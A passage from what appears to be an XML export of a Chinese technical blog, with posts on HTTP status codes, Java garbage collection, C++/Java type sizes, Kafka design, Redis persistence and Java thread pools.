/zoos/ID/animals/ID：删除某个指定动物园的指定动物 状态码(Status Code) 200 OK - [GET]：服务器成功返回用户请求的数据，该操作是幂等的(Idempotent) 201 CREATED - [POST/PUT/PATCH]：用户新建或修改数据成功。 202 Accepted - [*]：表示一个请求已经进入后台排队(异步任务) 204 NO CONTENT - [DELETE]：用户删除数据成功。 400 INVALID REQUEST - [POST/PUT/PATCH]：用户发出的请求有错误，服务器没有进行新建或修改数据的操作，该操作是幂等的。 401 Unauthorized - [*]：表示用户没有权限（令牌、用户名、密码错误）。 403 Forbidden - [*] 表示用户得到授权（与401错误相对），但是访问是被禁止的。 404 NOT FOUND - [*]：用户发出的请求针对的是不存在的记录，服务器没有进行操作，该操作是幂等的。 406 Not Acceptable - [GET]：用户请求的格式不可得（比如用户请求JSON格式，但是只有XML格式）。 410 Gone -[GET]：用户请求的资源被永久删除，且不会再得到的。 422 Unprocesable entity - [POST/PUT/PATCH] 当创建一个对象时，发生一个验证错误。 500 INTERNAL SERVER ERROR - [*]：服务器发生错误，用户将无法判断发出的请求是否成功。 参考链接 HTTP Methods: GET vs. POST RESTful API 设计指南]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>GET</tag>
        <tag>POST</tag>
        <tag>HTTP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java GC]]></title>
    <url>%2F2018%2F04%2F11%2FJava%20GC%2F</url>
    <content type="text"><![CDATA[Java堆空间划分 引用计数法(Reference Counting)引用计数法是最经典也是最古老的一种垃圾收集方法，它的实现很简单，只要为每个对象设置一个整型的计数器即可。但是引用计数法有两个严重的问题： 无法处理循环引用的情况。因此在Java的垃圾回收器中，没有使用这种算法。 引用计数器要求在每次因引用产生和消除的时候，需要伴随一个加法操作和减法操作，对系统性能会有一定的影响。 一个简单的循环引用问题描述如下：有对象A和对象B，对象A中含有对象B的引用，对象B中含有对象A的引用。此时，对象A和对象B的计数器都不为0。但是在系统中，却不存在任何第3飞蛾对象引用了A或B。也就是说，A和B是应该被回收的垃圾对象，但是由于垃圾对象间相互引用，从而使垃圾回收器无法识别，引起内存泄漏。 标记清除法(Mark-Sweep)标记清除算法是现代垃圾回收算法的思想基础。标记清除算法将垃圾回收分为两个阶段：标记阶段、清除阶段。一种可行的实现是，在标记阶段，首先通过跟节点标记所有从跟节点开始的可达对象。因此，未标记的对象就是未被利用的垃圾对象。然后在清除阶段，清除所有未被标记的对象。标记清除算法可能会产生最大问题是空间碎片。 复制算法(Copying)复制算法的核心思想是：将原有的内存空间分为两块，每次只使用其中一块，在垃圾回收时，将正在使用的内存中的存活对象复制到未使用的内存块中，之后清除正在使用的内存块中的所有对象，交换两个内存的角色，完成垃圾回收。 如果系统中的垃圾对象很多，复制算法需要赋值的存活对象数量就会相对较少。因此，在真正需要垃圾回收的时刻，复制算法的效率是很高的。又由于对象是在垃圾回收过程中，统一被复制到新的内存空间中的，因此可确保回收后的内存空间是没有碎片的。虽然有以上两大优点，但是复制算法的代价却是将系统内存折半，因此单纯的复制算法也很难让人接收。现代Java回收机制中新生代的Survivor区域在使用这样的回收算法，因为新生代垃圾对象比存活对象多，复制算法高效。新生代Survivor区是两个比较小，但大小相等的内存块，在我的调优参数设置中，Survivor区通常只占用新生代区域的1/8，但也不是固定的，多尝试比例可以有较好的收获。 题外话，我的一个项目上线初期，默认的JVM参数，CPU占用一直高居25%，但是调整后一直保持在20%以下，但同时内存占用却上升了。至于如何调整的，我还需要再深入一下。 记录一下详细的配置过程 : 第一次上线，所有的配置都是默认的，记录Java堆各个代的情况，根据情况进行调整；第二次上线，采取减少堆的大小: -Xmx250m -Xms40m -Xmn15m -XX:SurvivorRatio=10 效果显著，在原来CPU高居25%-30%的情况下，顺利降到20%以下；第三次上线，采取增大堆的大小： -Xmx250m -Xms75m -Xmn25m -XX:SurvivorRatio=10，效果更好，已经降到16%以下。 在这里补充一下Java垃圾回收的大致过程：在垃圾回收时，eden空间中的存活对象会被复制到未使用的survivor空间中(假设死to)，正在使用的suvivor空间(假设是from)中的年轻对象也会被赋值到to空间中(大对象，或者老年对象会直接进入老年代，如果to空间已满，则对象也会直接进入老年代)。此时eden空间和from空间中的剩余对象就是垃圾对象，可以直接清空，to空间则存放此次回收后的存活对象。这种改进的复制算法，既保证了空间的连续性，又避免了大量的内存空间浪费。 标记压缩(Mark-Compact)复制算法的高效性是建立在存活对象少，垃圾对象多的前提下的，这种情况在新生代经常发生，但是在老年代，更常见的情况是大部分对象都是存活对象。如果依然使用复制算法，复制成本也将很高。因此基于老年代垃圾回收的特性，需要使用其他的算法。 标记压缩算法是一种老年代的回收算法。它在标记清除算法的基础上做了一些优化。和标记算法一样，标记压缩算法也首先需要从跟节点开始，对所有可达对象做标记。但之后，它不是简单地清理未标记的对象，而是将所有的存活对象压缩到内存的一端。之后清理边界外所有的空间。这种方法避免了碎片的产生，又不需要两块相同的内存空间，因此其性价比比较高。 分代算法(Generational Collecting)上述介绍的算法中，并没有一种算法可以完全替代其他算法，它们都具有自己独特的优势和特点。因此根据垃圾回收对象的特性，使用合适的算法回收，才是明智的选择。分代算法就是基于这种思想，他将内存区间根据对象特点分成几块，根据每块内存空间的特点，使用不同的回收算法，以提高垃圾回收的效率。 一般来说Java虚拟机会将所有的新建对象都放入成为新生代的内存区域，新生代的特点死对象朝生夕灭，大约90%的新建对象会被很快回收，因此，新生代比较适合使用复制算法。当一个对象经过几次回收后依然存活，对象就会被放入成为老年代的内存空间。在老年代中，几乎所有的对象都是经过几次垃圾回收后依然得以存活的。因此，可以认为这些对象在一段时间期内，甚至在应用程序的整个生命周期中，将是常驻内存的。那么这些对象回收就应该采用标记压缩或标记清除算法，以提高垃圾回收效率。 对于新生代和老年代来说，通常新生代回收频率很高，但是每次回收的耗时都很短，而老年代回收频率比较低，但是会消耗更多的时间。同时这引来一个问题，当老年代中的对象持有新生代对象的引用时怎么办？为了解决这个问题，虚拟机可能使用一种叫做卡表(Card Table)的数据结构。卡表为一个比特位集合，每一个比特位可以用来表示老年代的某一区域中的所有对象是否持有新生代对象的引用。这样在新生代GC时，可以不用花大量的时间扫描所有老年代对象，来确定每一个对象的引用关系，而可以先扫描卡表，当卡表的标记为1时才扫描给定区域的老年代对象；而当卡表位为0时就不用是扫描所在区域的老年代对象。 分区算法(Region)分代算法是按照对象的生命周期长短划分成两部分，分区算法将真个给堆空间划分为连续的不同小区间，每个区间都独立使用，独立回收。这种算法的好处是可以控制一次回收多少个小区间。 一般来说，在相同条件下，堆空间越大，一次GC时所需要的时间就越长，从而产生的停顿也越长。为了更好地控制GC产生的停顿时间，将一块大的内存区域分割成多个小块，根据目标停顿时间，每次合理地回收若干个小区间，而不是整个堆空间，从而减少一次GC所产生的停顿。 参考链接 Java垃圾回收算法 JVM虚拟机-垃圾回收算法 实战Java虚拟机(图书)]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>GC</tag>
        <tag>Java</tag>
        <tag>JMM</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[C++ Java基本类型size问题]]></title>
    <url>%2F2018%2F04%2F08%2F%E5%9F%BA%E6%9C%AC%E7%B1%BB%E5%9E%8B%2F</url>
    <content type="text"><![CDATA[鉴于之前多次面试题考察基本类型大小问题，今天来做个记录。 C++C++的基本类型有bool char short float double int long long long pointer(指针) 数据类型 32位系统字节数 32系统二进制位数 64位系统字节数 64位系统二进制位数 bool 1 8 1 8 char 1 8 1 8 short 2 16 2 16 int 4 32 4 32 long 4 32 8 64 long long 8 64 8 64 float 4 32 4 32 double 8 64 8 64 pointer 4 32 8 64 可以看出其中只有long pointer是不同的，32位平台32位，64位平台64位，其实pointer就是用long表示的12345678910111213141516#include &lt;iostream&gt;using namespace std;int main()&#123; cout &lt;&lt; "bool sizeof : " &lt;&lt; sizeof(bool) &lt;&lt; endl; cout &lt;&lt; "char sizeof : " &lt;&lt; sizeof(char) &lt;&lt; endl; cout &lt;&lt; "short sizeof : " &lt;&lt; sizeof(short) &lt;&lt; endl; cout &lt;&lt; "int sizeof : " &lt;&lt; sizeof(int) &lt;&lt; endl; cout &lt;&lt; "long sizeof : " &lt;&lt; sizeof(long) &lt;&lt; endl; cout &lt;&lt; "long long sizeof : " &lt;&lt; sizeof(long long) &lt;&lt; endl; cout &lt;&lt; "float sizeof : " &lt;&lt; sizeof(float) &lt;&lt; endl; cout &lt;&lt; "double sizeof : " &lt;&lt; sizeof(double) &lt;&lt; endl; cout &lt;&lt; "pointer sizeof : " &lt;&lt; sizeof(void *) &lt;&lt; endl; return 0;&#125; 64位linux输出结果123456789bool sizeof : 1char sizeof : 1short sizeof : 2int sizeof : 4long sizeof : 8long long sizeof : 8float sizeof : 4double sizeof : 8pointer sizeof : 8 JavaJava的基本类型有boolean char short float double int long byte, Java中的基本类型大小是固定的，与操作平台位数无关 数据类型 字节数 二进制位数 boolen 1 8 byte 1 8 char 2 16 short 2 16 int 4 32 long 8 64 float 4 32 double 8 64 值得注意的是Java中的char类型占两个字节，而C++中只占一个字节。char在Java中是16位的，因为Java用的是Unicode。不过8位的ASCII码包含在Unicode中，是从0~127的。至于为什么，这里留下一点故事 ： Java中使用Unicode的原因是，Java的Applet允许全世界范围内运行，那它就需要一种可以表述人类所有语言的字符编码。Unicode。但是English，Spanish，German, French根本不需要这么表示，所以它们其实采用ASCII码会更高效。这中间就存在一个权衡问题。那么是不是该好奇中文字应该占多少字节，这个不同的编码不一样，通常在2-4个字节： GBK编码，一个汉字占两个字节 UTF-16编码，通常汉字占两个字节 CJKV扩展B区、扩展C区、扩展D区中的汉字占四个字节（一般字符的Unicode范围是U+0000至U+FFFF，而这些扩展部分的范围大于U+20000，因而要用两个UTF-16） UTF-8编码是变长编码，通常汉字占三个字节，扩展B区以后的汉字占四个字节 123456789101112public class TypeSize &#123; public static void main(String[] args) &#123; System.out.println("byte sizeof : " + Byte.SIZE); System.out.println("char sizeof : " + Character.SIZE); System.out.println("short sizeof : " + Short.SIZE); System.out.println("int sizeof : " + Integer.SIZE); System.out.println("long sizeof : " + Long.SIZE); System.out.println("float sizeof : " + Float.SIZE); System.out.println("double sizeof : " + Double.SIZE); &#125;&#125; 输出结果1234567byte sizeof : 8char sizeof : 16short sizeof : 16int sizeof : 32long sizeof : 64float sizeof : 32double sizeof : 64]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Kafka 简述]]></title>
    <url>%2F2018%2F04%2F02%2FKafka%2F</url>
    <content type="text"><![CDATA[持久化Don.t fear the filesystemKafka非常依赖文件系统来存储和缓存消息，但人们在这里总是有一个错觉disks are slow。事实上，disks可以很慢，也可以很快，这取决于人们怎么用它，一个设计合理的磁盘结构通常可以和网络一样快。 这里有一个事实：磁盘读取快慢主要取决于寻道延时。six 7200rpm SATA RAID-5 array的磁盘linear writes的读取速度大概为600MB/sec，但random writes的读取速度为100k/sec，正因为现在操作系统通常采用随机存储的方式，导致人们对磁盘速度产生了错觉。 持久化策略当我们保持消息队列的时候，快用完内存空间时，并不采用操作系统的策略(尽可能保持内存中的数据，将不常用的数据块替换出去)，而是将内存中的消息全部冲洗到文件系统中。个人理解Kafka能够高吞吐的原因在于Batching、larger network packets、larger sequential disk operations、contiguous memory block，所有的策略都为了保证Kafka将随机消息写转为线性写。 个人翻译能力有限，留下英文原文 This suggests a design which is very simple: rather than maintain as much as possible in-memory and flush it all out to the filesystem in a panic when we run out of space, we invert that. All data is immediately written to a persistent log on the filesystem without necessarily flushing to disk. In effect this just means that it is transferred into the kernel’s pagecache. 此外Kafka集群保留所有publish的数据，无论这些消息有没有被消费。比如，保留策略为两天，那么两天之内，消息仍然在磁盘上，两天后为了腾出空间，就将数据移除。这样的好处在于，如果有多个消费者不会影响Kafka消息，也不会影响其他消费者。 Producer负载均衡 : 生产者直接将数据发送给一个分区的leader broker, 它没有介入路由层。客户端控制它将消息发布到哪个分区。这可以随机完成，实现一种随机负载平衡，或者可以通过某种语义分区功能完成。Kafka公开了用于语义分区的接口，方法是允许用户指定要分区的密钥并使用它来hash分区（如果需要，还可以选择覆盖分区函数）。例如，如果选择的密钥是用户ID，则给定用户的所有数据都将被发送到同一分区。这反过来将允许消费者对他们的消费做出局部性假设。这种分区风格方便了那些对用户消息所在分区有严格要求的情况。异步发送 : 批次是效率的重要推动力之一，为了实现批量生产，Kafka producer将尝试在内存中积累数据，并在单个请求中发送更大批次的数据。批处理可以配置消息积累大小，并且不超过某个固定的延迟限制（比如64k或10ms）。这允许发送积累好的大块消息，并且在服务器上只进行几次较大的 I/O 操作。这种缓冲是可配置的，并提供了一种机制来折中少量额外的延迟以获得更好的吞吐量 Message delivery semantics : 0.11.0.0版本之前，如果Producer没有收到代表消息已经提交的响应，那么Producer只有重新发送消息，这样有个问题：在消息重发期间，上一次发送的消息已经提交成功，那么同一块消息可能被重复写入log。从0.11.0.0版本开始Kafka提供了一个选项保证消息不会被重复，broker分配给每个Producer一个ID，使用Producer发送来的序列码(每个消息都有一个序列码)删除重复的消息。另外从0.11.0.0开始Producer支持发送消息给多个topic分区，使用的是像合约一样的语义。 翻译能力有限，留下英文原文 Also beginning with 0.11.0.0, the producer supports the ability to send messages to multiple topic partitions using transaction-like semantics: i.e. either all messages are successfully written or none of them are. 上述说讲的是如何保证消息提交，但不是所有的用例都需要这样强力的保证，对于延时敏感的用例，我们允许Producer指定其耐心等待程度，它可以是10ms量级的等待，甚至是完全的异步。 ConsumerKafka消费者通过向希望消费的分区的leader发出“获取”请求而工作。消费者在消费请求中会指定日志offset，然后接收offset之后的一大块数据a chunk of log，因此，消费者对这个位置具有重要的控制权，并且可以倒带它以在需要时重新消费数据。由于offset的控制权在消费者手里，所以理论上，消费者是可以按照自己想要的方式去消费消息，比如reset to an older offset to reprocess data from the past、skip ahead to the most recent record and start consuming from &quot;now&quot;。 每个消费者都有一个自己的消费组名称标示，每一个发布到topic上的消息会被投递到每个订阅了此topic的消费者组的某一个消费者（译者注：每组都会投递，但每组都只会投递一份到某个消费者）。这个被选中的消费者实例可以在不同的处理程序中或者不同的机器之上。 如果所有的消费者实例都有相同的消费组标示(consumer group),那么整个结构就是一个传统的消息队列模式，消费者之间负载均衡。如果所有的消费者实例都采用不同的消费组，那么真个结构就是订阅模式，每一个消息将被广播给每一个消费者。 Push还是Pull : 最开始考虑的问题是消费值主动从brokers pull数据还是brokers push数据给消费者。Kafka采用了非常传统的设计，生产者push数据给brokers然后消费者从brokers pull数据。在其他的 logging-centric systems, such as Scribe and Apache Flume 中采用的是将数据推送给下游的方式。 它们各有优缺点。然而，push-bases的系统难以处理不同的消费者，因为brokers控制着数据传输的速度，我们的目标通常是消费者能够以最大可能的速度消费。不幸的是push-based当消费率低于生产速度时，消费者往往会不知所措。pull-based system有个很舒服的属性，消费者只需要简单地falls behind并尽可能的跟上生产者速率。还有一个优点是它适用于发送给消费者的大量批量数据。push-based必须发送一个请求给下游，同时积累数据然后发送数据给消费者，但它并不知道下游是否有能力处理这些数据。 pull-based的缺陷在于当brokers没有消息可以消费时，消费者就陷入轮询的tight loop。为了规避这个问题，Kafka在pull请求里面带有参数允许消费者请求阻塞在long poll直到数据到达(同时可选项是等到给定大小的数据时再消费以保证大块传输减少网络延时) 备份Kafka为Topic的每个Partition日志进行备份，备份数量可以由用户进行配置。这保证了系统的自动容错，如果有服务器宕机，消息可以从剩余的服务器中读取。备份的单位是Topic的分区。在没有发生异常的情况下，Kafka中每个分区都会有一个Leader和0或多个Follower。备份包含Leader在内（也就是说如果备份数为3，那么有一个Leader Partition和两个Follower Partition）。所有的读写请求都落在Leader Partition上。通常情况下分区要比Broker多，Leader分区分布在Broker上。Follower上的日志和Leader上的日志相同，拥有相同的偏移量和消息顺序（当然，在特定时间内，Leader上日志会有一部分数据还没复制到Follower上）。 Follower作为普通的Consumer消费Leader上的日志，并应用到自己的日志中。Leader允许Follower自然的，成批的从服务端获取日志并应用到自己的日志中。大部分分布式系统都需要自动处理故障，需要对节点“alive”进行精确的定义。例如在Kafka中，节点存活需要满足两个条件： 节点需要保持它和ZooKeeper之间的Session（通过ZK的心跳机制） 如果是Follower，需要复制Leader上的写事件，并且复制进度没有“落后太多” 一条消息在被应用到所有的备份上之后被认为是“已经提交的”。只有提交了的消息会被Consumer消费。这意味着Consumer不需要担心Leader节点宕机后消息会丢失。另一方面，Producer可以配置是否等待消息被提交，这取决于他们在延迟和可用性上的权衡。这个可以通过Producer的配置项中设置。Kafka提供了一条消息被提交之后，只要还有一个备份可用，消息就不会丢失的保证 日志包含两个partition，名称为“my_topic”的Topic的日志包含两个目录（名称为my_topic_0和my_topic_1）,其中包含该Topic的消息的数据文件。日志文件的格式是log entry的序列；每个log entry都是4字节的消息长度N加上后面N个字节的消息数据。每条消息都有一个64位的offset标识这条消息在这个Topic的Partition中的偏移量。消息在磁盘中的存储格式如下所示。每个日志文件都以它存储的第一条消息的offset命名。所以第一个文件会命名为00000000000.kafka，随后每个文件的文件名将是前一个文件的文件名加上S的正数，S是配置中指定的单个文件的大小 使用消息的Offset作为消息ID是不常见的。我们初始的想法是在Producer生成一个GUID作为Message ID，并在Broker上维持ID和Offset之间的映射关系。但是因为Consumer需要为每个Server维持一个ID，那么GUID的全局唯一性就变得没什么意义了。此外，维持一个随机的ID和Offset的映射关系将给索引的构建带来巨大的负担，本质上需要一个完整的持久化的随机存取的数据结构。因此，为了简化查找结构，我们决定使用每个分区的原子计数器，它可以和分区ID加上ServerID来唯一标识一条消息。一旦使用了计数器，直接使用Offset进行跳转是顺其自然的，两者都是分区内单调递增的整数。由于偏移量从消费者API中隐藏起来，因此这个决定是最终的实现细节，所以我们采用更有效的方法。 Writes日志允许连续追加到最后一个文件。当文件达到配置的大小时（如1GB）将滚动到一个新文件。日志采用两个配置：M，配置达到多少条消息后进行刷盘；S，配置多长时间之后进行刷盘。这个持久化策略保证最多只丢失M条消息或者S秒之内的消息。 Reads读取通过提供64位的offset和S-byte的chunk大小来实现。这将返回包含在S-byte的buffer的消息迭代。S比任意单条消息都大，但是如果在异常的超大消息的情况下，读取操作可以通过多次重试，每次都将buffer大小翻倍，直到消息被读取成功。最大消息大小和buffer大小可以配置，用于拒绝超过特定大小的消息，以限制客户端读取消息时需要拓展的buffer大小。buffer可能以不完整的消息作为结尾，这可以通过消息大小来轻松的检测到。实际的读取操作首先需要定位offset所在的文件，再将offset转化为文件内相对的偏移量，然后从文件的这个偏移量开始读取数据。搜索操作通过内存中映射的文件的简单的二分查找完成。日志提供了获取最近写入消息的能力以允许客户端从“当前时间”开始订阅。这在客户端无法在指定天数内消费掉消息的场景中非常有用。在这种情况下，如果客户端尝试消费一个不存在的offset将抛出OutOfRangeException异常并且可以根据场景重置或者失败 Deletes数据删除一次删除一个日志段。日志管理器允许通过插件的形式实现删除策略来选择那些文件是合适删除的。当前的删除策略是日志文件的修改时间已经过去N天，保留最近N GB数据的策略也是有用的。为了避免删除时锁定读取操作，我们采用copy-on-write的方式来实现，以保证一致性的视图。 日志压缩日志压缩确保Kafka会为一个Topic分区数据日志中保留至少message key的最后一个值。在持久化那部分我们已经说明了在一断时间或达到特定大小的时候丢弃旧日志的简单方法。这适用于像日志这样每一条数据都是独立数据的情况。但是重要类别的数据是根据key处理的数据（例如DB中表的变更数据）。 让我们来讨论这样一个具体的流的例子。一个Topic包含了用户email address信息；每一次用户变更邮箱地址，我们都向这个topic发送一条消息，使用用户ID作为primay key。现在我们已经为用户ID为123的用户发送了一些消息，每条消息包含了email address的变更:123456789123 =&gt; bill@microsoft.com . . .123 =&gt; bill@gatesfoundation.org . . .123 =&gt; bill@gmail.com 日志压缩为我们提供了更精细的保留机制，至少保存每个key最后一个变更（如123 =&gt; bill@gmail.com）。这样做我们确保了这个日志包含了所有key最后一个值的快照。这样Consumer可以重建状态而不需要保留完成的变更日志。 假设我们有无限的日志，记录每次变更日志，我们从一开始就捕获每一次变更。使用这个完整的日志，我们可以通过回放日志来恢复到任何一个时间点的状态。这种假设的情况下，完整的日志是不实际的，对于那些每一行记录会变更多次的系统，即使数据集很小，日志也会无限的增长下去。丢弃旧日志的简单操作可以限制空间的增长，但是无法重建状态——因为旧的日志被丢弃，可能一部分记录的状态会无法重建（这写记录所有的状态变更都在就日志中）。 日志压缩机制是更细粒度的，每个记录都保留的机制，而不是基于时间的粗粒度。这个想法是选择性的删除哪些有更新的变更的记录的日志。这样最终日志至少包含每个key的记录的最后一个状态。压缩操作通过在后台周期性的拷贝日志段来完成。清除操作不会阻塞读取，并且可以被配置不超过一定IO吞吐来避免影响Producer和Consumer。 补上几张图片 参考链接 https://kafkadoc.beanmr.com/010_getting_started/01_introduction_cn.html http://kafka.apache.org/intro http://kafka.apache.org/documentation/ 备份 日志压缩 日志]]></content>
      <categories>
        <category>分布式计算</category>
      </categories>
      <tags>
        <tag>Kafka</tag>
        <tag>持久化</tag>
        <tag>备份</tag>
        <tag>日志压缩</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Redis持久化]]></title>
    <url>%2F2018%2F04%2F01%2FRedis%2F</url>
    <content type="text"><![CDATA[持久化方式RDB持久化Redis安装后默认支持的持久化方式。在指定的时间间隔内将内存中的数据集快照写入到磁盘。在配置文件中，通常默认的配置是每900秒至少有一个key发生变化时会持久化一次; 每300秒至少有10个key发生变化时会持久化一次; 每60秒10000次变化时持久化一次 优点 RDB 是一个非常紧凑（compact）的文件，它保存了 Redis 在某个时间点上的数据集。 这种文件非常适合用于进行备份： 比如说，你可以在最近的 24 小时内，每小时备份一次 RDB 文件，并且在每个月的每一天，也备份一个 RDB 文件。 这样的话，即使遇上问题，也可以随时将数据集还原到不同的版本。 RDB 非常适用于灾难恢复（disaster recovery）：它只有一个文件，并且内容都非常紧凑，可以（在加密后）将它传送到别的数据中心，或者亚马逊 S3 中 RDB 可以最大化 Redis 的性能：父进程在保存 RDB 文件时唯一要做的就是 fork 出一个子进程，然后这个子进程就会处理接下来的所有保存工作，父进程无须执行任何磁盘 I/O 操作。 RDB 在恢复大数据集时的速度比 AOF 的恢复速度要快。 缺点 如果你需要尽量避免在服务器故障时丢失数据，那么 RDB 不适合你。 虽然 Redis 允许你设置不同的保存点（save point）来控制保存 RDB 文件的频率， 但是， 因为RDB 文件需要保存整个数据集的状态， 所以它并不是一个轻松的操作。 因此你可能会至少 5 分钟才保存一次 RDB 文件。 在这种情况下， 一旦发生故障停机， 你就可能会丢失好几分钟的数据。 每次保存 RDB 的时候，Redis 都要 fork() 出一个子进程，并由子进程来进行实际的持久化工作。 在数据集比较庞大时， fork() 可能会非常耗时，造成服务器在某某毫秒内停止处理客户端； 如果数据集非常巨大，并且 CPU 时间非常紧张的话，那么这种停止时间甚至可能会长达整整一秒。 虽然 AOF 重写也需要进行 fork() ，但无论 AOF 重写的执行间隔有多长，数据的耐久性都不会有任何损失。 AOF持久化以日志的形式处理服务器所处理的每一个操作，当Redis重启后，它会读取日志文件来重新构建数据库。 优点 使用 AOF 持久化会让 Redis 变得非常耐久（much more durable）：你可以设置不同的 fsync 策略，比如无 fsync ，每秒钟一次 fsync ，或者每次执行写入命令时 fsync 。 AOF 的默认策略为每秒钟 fsync 一次，在这种配置下，Redis 仍然可以保持良好的性能，并且就算发生故障停机，也最多只会丢失一秒钟的数据（ fsync 会在后台线程执行，所以主线程可以继续努力地处理命令请求）。 AOF 文件是一个只进行追加操作的日志文件（append only log）， 因此对 AOF 文件的写入不需要进行 seek ， 即使日志因为某些原因而包含了未写入完整的命令（比如写入时磁盘已满，写入中途停机，等等）， redis-check-aof 工具也可以轻易地修复这种问题。 Redis 可以在 AOF 文件体积变得过大时，自动地在后台对 AOF 进行重写： 重写后的新 AOF 文件包含了恢复当前数据集所需的最小命令集合。 整个重写操作是绝对安全的，因为 Redis 在创建新 AOF 文件的过程中，会继续将命令追加到现有的 AOF 文件里面，即使重写过程中发生停机，现有的 AOF 文件也不会丢失。 而一旦新 AOF 文件创建完毕，Redis 就会从旧 AOF 文件切换到新 AOF 文件，并开始对新 AOF 文件进行追加操作。 AOF 文件有序地保存了对数据库执行的所有写入操作， 这些写入操作以 Redis 协议的格式保存， 因此 AOF 文件的内容非常容易被人读懂， 对文件进行分析（parse）也很轻松。 导出（export） AOF 文件也非常简单： 举个例子， 如果你不小心执行了 FLUSHALL 命令， 但只要 AOF 文件未被重写， 那么只要停止服务器， 移除 AOF 文件末尾的 FLUSHALL 命令， 并重启 Redis ， 就可以将数据集恢复到 FLUSHALL 执行之前的状态。 缺点 对于相同的数据集来说，AOF 文件的体积通常要大于 RDB 文件的体积。 根据所使用的 fsync 策略，AOF 的速度可能会慢于 RDB 。 在一般情况下， 每秒 fsync 的性能依然非常高， 而关闭 fsync 可以让 AOF 的速度和 RDB 一样快， 即使在高负荷之下也是如此。 不过在处理巨大的写入载入时，RDB 可以提供更有保证的最大延迟时间（latency）。 AOF 在过去曾经发生过这样的 bug ： 因为个别命令的原因，导致 AOF 文件在重新载入时，无法将数据集恢复成保存时的原样。 （举个例子，阻塞命令 BRPOPLPUSH 就曾经引起过这样的 bug 。） 测试套件里为这种情况添加了测试： 它们会自动生成随机的、复杂的数据集， 并通过重新载入这些数据来确保一切正常。 虽然这种 bug 在 AOF 文件中并不常见， 但是对比来说， RDB 几乎是不可能出现这种 bug 的。 无持久化通过配置来禁用Redis持久化功能。 同时使用RDB和AOFRDB快照默认情况下RDB的快照文件为dump.rdb当Redis需要保存dump.rdb时，服务器会进行一下操作: Redis调用fork(), 同时拥有父进程和子进程。 子进程将数据集写入临时的RDB文件中。 当子进程完成对新RDB文件的写入时，Redis用新的RDB文件替换旧的RDB文件，并将旧的RDB文件删除。 AOF重写因为AOF采用的是命令追加，因此随着命令的积累，AOF文件会越来越大，Redis就有必要进行AOF重建(rebuild)。 举个例子，用户调用了100次INCR，那么仅仅是为了保存这个计数器的当前值，AOF就需要100条记录(entry)。然而实际上只需要一个SET命令保存计数器当前值，其余99条记录都是多余的。 为了处理这种情况，Redis支持一种有趣的特性: 可以在不打断服务器客户端的情况下，对AOF进行重建。执行BGREWRITEAOF命令，Redis会生成一个新的AOF文件，这个文件会包含重建当前数据集所需的最少命令。 AOF fsync你可以配置Redis多久才将数据fsync到磁盘一次有三个选项: 每次有新命令追加到AOF就进行一次fsync : 非常慢，也非常安全 每秒fsync一次 : 足够块(跟RDB持久化差不多),并且故障只会损失1秒内的数据 从不fsync : 将数据交由操作系统来处理。更快，但也更不安全 通常推荐(也是默认)每秒进行一次fsync，这种策略可以兼顾速度和安全性。 总是fsync的策略在实际使用中非常慢，即使在 Redis 2.0 对相关的程序进行了改进之后仍是如此 —— 频繁调用 fsync 注定了这种策略不可能快得起来。 AOF运作方式 Redis调用fork(), 同时拥有父进程和子进程。 子进程开始将新的AOF写入临时文件。 对于新执行的命令，父进程一边将其放入内存缓冲中，一边将这些改动追加到AOF文件末尾 : 这样即使在重写的中途发生停机，现有的AOF还是安全的。 当子进程完成重写工作时，它给父进程发送一个信号，父进程收到信号后将内存缓冲的所有数据追加到新AOF文件末尾。 Redis原子第将新AOF文件替换旧AOF文件，之后的命令都会追加到新AOF文件末尾。 参考链接 http://redisdoc.com/topic/persistence.html]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>redis持久化</tag>
        <tag>redis RDB</tag>
        <tag>redis AOF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java 线程池]]></title>
    <url>%2F2018%2F03%2F17%2FJava%E7%BA%BF%E7%A8%8B%E6%B1%A0%2F</url>
    <content type="text"><![CDATA[概念Java Thread pool represents a group of worker threads that are waiting for the job and reuse many times.Java中创建一个线程是一个相对耗时的操作，当程序中频繁的创建和使用线程时，会产生严重的内存管理开销(significant memory management overhead)。基于这个原因，Java有了线程池的概念，在使用线程之前，创建一个线程池。当一个任务需要一个线程去运行时，程序去线程池中选择一个空闲线程去运行。当任务结束后，线程又重新放进线程池中等待下一个任务，这样就避免了频繁的创建线程，大大节省了内存管理开销。 线程池分类fixed thread pool : 固型线程池—-创建时指定创建的线程数，当任务使用完线程池中的空闲线程，则新任务将等待被占用的线程执行完任务。 固定长度线程池的优点 : 用Web服务器举例说明，Web服务器需要单独的线程去处理一个HTTP请求，当出现大量的HTTP请求，超过了系统能够承受的范围，那么这个Web服务器就会停止响应所有的请求。而如果使用固定长度线程池，虽然不能立刻服务请求，但系统会尽最大能力去处理。 12345678910111213141516171819202122232425262728class WorkerThread implements Runnable &#123; private String message; public WorkerThread(String s)&#123; this.message=s; &#125; public void run() &#123; System.out.println(Thread.currentThread().getName()+" (Start) message = "+message); processmessage();//call processmessage method that sleeps the thread for 2 seconds System.out.println(Thread.currentThread().getName()+" (End)");//prints thread name &#125; private void processmessage() &#123; try &#123; Thread.sleep(2000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125;&#125;public class TestThreadPool &#123; public static void main(String[] args) &#123; ExecutorService executor = Executors.newFixedThreadPool(5);//creating a pool of 5 threads for (int i = 0; i &lt; 10; i++) &#123; Runnable worker = new WorkerThread("" + i); executor.execute(worker);//calling execute method of ExecutorService &#125; executor.shutdown(); while (!executor.isTerminated()) &#123; &#125; System.out.println("Finished all threads"); &#125;&#125; CachedThreadPool : 缓存线程池，这样的线程池适合于有许多short-lived任务的程序。任务执行前先查看线程池中是否有当前执行线程的缓存，如果有就resue(复用),如果没有,那么需要创建一个线程来完成当前的调用。并且这类线程池内部规定能resue(复用)的线程，空闲的时间不能超过60s,一旦超过了60s,就会被移出线程池。SingleThreadExecutor : 单例执行器，这样的exector保证了一个时刻只有一个线程执行。ScheduledThreadPool : 